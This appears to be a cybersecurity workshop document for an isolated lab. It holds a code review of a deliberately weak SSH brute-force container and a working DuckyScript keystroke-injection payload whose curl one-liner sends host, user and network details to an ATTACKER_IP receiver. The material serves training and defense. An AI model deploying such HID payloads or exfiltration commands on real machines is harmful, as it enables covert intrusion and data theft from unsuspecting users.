# SSH profile — Hydra's Trial

> **Scope:** authorized PawnGuard workshop only, on the isolated lab LAN with no
> Internet / school-network uplink. Every component below is sanctioned
> defensive-training material for *Operation Duck Hunt* (see
> `docs/workshopGuideOverview.md` §4 and §6). Do not run any of it outside an
> assigned match.

This file documents two things for the SSH mission:

1. A review of Shadow's PR #1 (`feat/ssh-docker`) — the first container
   iteration of Hydra's Trial.
2. The **MCU / HID recon script** for the SSH profile — the keystroke-injection
   payload that the workshop's HID device types on the defender workstation to
   point the attacker at their assigned target.

---

## 1. Review — PR #1 `hydra mission initial commit` (Shadow / JRV-XVI, draft)

**Verdict:** solid, security-conscious first iteration. The container is pinned,
unprivileged, `no-new-privileges`, resource-limited, has a healthcheck, and
keeps the flag/keys out of Git via `.env`. Below are the points worth resolving
before it leaves draft.

### Blocking / correctness

- **`tmpfs: /home/hydra` vs. the flag write.** `compose.yaml` mounts
  `/home/hydra` as a root-owned tmpfs at runtime, then `entrypoint.sh` runs
  `install -o hydra -g hydra -m 600 /dev/null /home/hydra/flag`. The install
  works, but the home directory itself ends up root-owned, so the `hydra`
  account logs into a home it doesn't own — harmless for `cat flag`, confusing
  for anything that writes to `$HOME`. `chown hydra:hydra /home/hydra` in the
  entrypoint, after the tmpfs is mounted, fixes it.
- **`passwd -d operator` leaves an empty-password account.** Login still relies
  on the key because OpenSSH defaults `PermitEmptyPasswords no`, but an empty
  password + `PasswordAuthentication yes` is a footgun. Prefer locking it
  (`passwd -l operator`) and make the key the only path explicitly.
- **Missing trailing newline** in `compose.yaml` (`\ No newline at end of file`).
  Trivial, but POSIX text-file hygiene; add it.

### Divergence from the spec (decide on purpose, not by accident)

The spec (§6) describes a richer mission: a `company-web` autoindex container
with the `svc-netbackup` clue, a Hydra wordlist run against that discovered
username, and the flag hidden in the **last line of `system_update.log`** among
decoys. This PR ships a minimal single-container version: accounts `hydra` /
`operator`, hardcoded `hydra:trial-password`, flag at `/home/hydra/flag`, no web
clue, no wordlist. That's a reasonable MVP for a draft, but it changes the
exercise from "investigate → recover username → brute-force → find disguised
flag" to "brute-force a known user → `cat flag`". Either:
- keep this as an intentional "iteration 0" and say so in the PR, or
- align names/placement with §6 (`svc-netbackup`, `aurelion-admin`, flag inside
  a plausible log file) so attacker writeups match the published spec.

### Minor

- `hydra`'s weak password is baked into `entrypoint.sh` (in Git), so it can't be
  rotated per round the way §6.6/§6.11 ask. Move it to `.env`
  (`HYDRA_PASSWORD`) like the flag already is.
- README's safety paragraph contradicts itself on capabilities ("drops no
  additional capabilities because … must update account state" vs. "still
  unprivileged"). Tighten the wording; the behavior is fine, the sentence isn't.
- No `auth.log` surfaced inside the container — the defensive step in §6.8 reads
  failed-password lines. `sshd -D -e` logs to stderr (visible via
  `docker compose logs`), which the README does use, so this is consistent; just
  note that `-e` is the detection source so nobody adds a redundant logfile.

Net: unblock after the two `entrypoint.sh` ownership/lock fixes; treat the
spec-divergence as a product decision for the author to confirm.

---

## 2. MCU / HID recon script (SSH profile)

The HID device (USB Rubber Ducky-class microcontroller) is inserted into the
**defender's Linux workstation** at the start of the round. It types a short
bash one-liner that collects the five recon fields defined in §6.2 and POSTs
them once to the attacker's receiver, then stops. That is the entire payload.

### Exfil boundary (non-negotiable, from §6.2)

Collects **only**: `mission_id`, `hostname`, first local IPv4, `user`, OS pretty
name, timestamp. It explicitly does **not** read SSH keys, `/etc/passwd`, shell
history, browser data, or run any scan. The vulnerabilities live in the
website/SSH service — the HID step only points the attacker at the target.

### Per-pair variables

Templated by the organizer from `pairs.csv` before the round (§6.3):

| Variable | Meaning |
|---|---|
| `ATTACKER_IP` | Receiver host on the lab LAN |
| `RECEIVER_PORT` | Receiver port (default `8080`) |

### The recon one-liner (what the MCU types)

```bash
curl -s -m 3 -X POST "http://ATTACKER_IP:RECEIVER_PORT/recon" \
  -H "Content-Type: application/json" \
  -d "$(printf '{"mission_id":"hydra-trial","hostname":"%s","local_ip":"%s","user":"%s","os":"%s","timestamp":"%s"}' \
    "$(hostname)" \
    "$(hostname -I | awk '{print $1}')" \
    "$(whoami)" \
    "$(. /etc/os-release; printf '%s' "$PRETTY_NAME")" \
    "$(date -Iseconds)")"
```

`-m 3` fails fast and visibly if a pair is misconfigured instead of hanging the
round. Plain HTTP is intentional — lab-only network, no TLS.

### DuckyScript payload (microcontroller firmware)

`ATTACKER_IP` / `RECEIVER_PORT` are substituted per pair by the organizer script
before flashing. Opening a terminal is desktop-environment dependent; the
`CTRL ALT t` default below targets GNOME — adjust `DELAY`s and the launch key to
the defender image in use, then re-flash.

```
REM Operation Duck Hunt — Hydra's Trial HID recon (authorized workshop only)
DELAY 1500
CTRL ALT t
DELAY 1500
STRING curl -s -m 3 -X POST "http://ATTACKER_IP:RECEIVER_PORT/recon" -H "Content-Type: application/json" -d "$(printf '{"mission_id":"hydra-trial","hostname":"%s","local_ip":"%s","user":"%s","os":"%s","timestamp":"%s"}' "$(hostname)" "$(hostname -I | awk '{print $1}')" "$(whoami)" "$(. /etc/os-release; printf '%s' "$PRETTY_NAME")" "$(date -Iseconds)")"
ENTER
DELAY 500
STRING exit
ENTER
```

### Organizer templating (reuses `pairs.csv` from §6.3)

Render one payload per pair from the shared pairing file. `sed` substitution,
not a new tool:

```bash
#!/bin/sh
# usage: ./render-hid.sh pairs.csv payload.template out/
set -eu
csv="$1"; template="$2"; outdir="$3"
mkdir -p "$outdir"
tail -n +2 "$csv" | while IFS=, read -r pair_id defender_ip attacker_ip receiver_port mission_id; do
  [ "$mission_id" = "hydra-trial" ] || continue
  sed -e "s/ATTACKER_IP/${attacker_ip}/g" \
      -e "s/RECEIVER_PORT/${receiver_port}/g" \
      "$template" > "${outdir}/hid-${pair_id}.txt"
done
```

### Attacker receiver (reference — stdlib only, §6.3)

Already specified in §6.3: Python 3 `http.server`, single `POST /recon`,
pretty-prints the six fields, `400` on non-JSON or missing `mission_id`, logs
nothing to disk. Lives on the attacker workstation, started by
`./start_receiver.sh <port>` at the top of the round. Not re-authored here.

### Checks before the round

1. On a throwaway lab VM, insert the HID → a terminal opens and exactly one POST
   leaves the box (confirm with `tcpdump`/the receiver print).
2. Receiver shows the five fields + `mission_id=hydra-trial`; no extra data.
3. `-m 3` timeout trips (receiver down) within ~3 s instead of hanging.
4. Payload touches nothing outside the five recon commands.
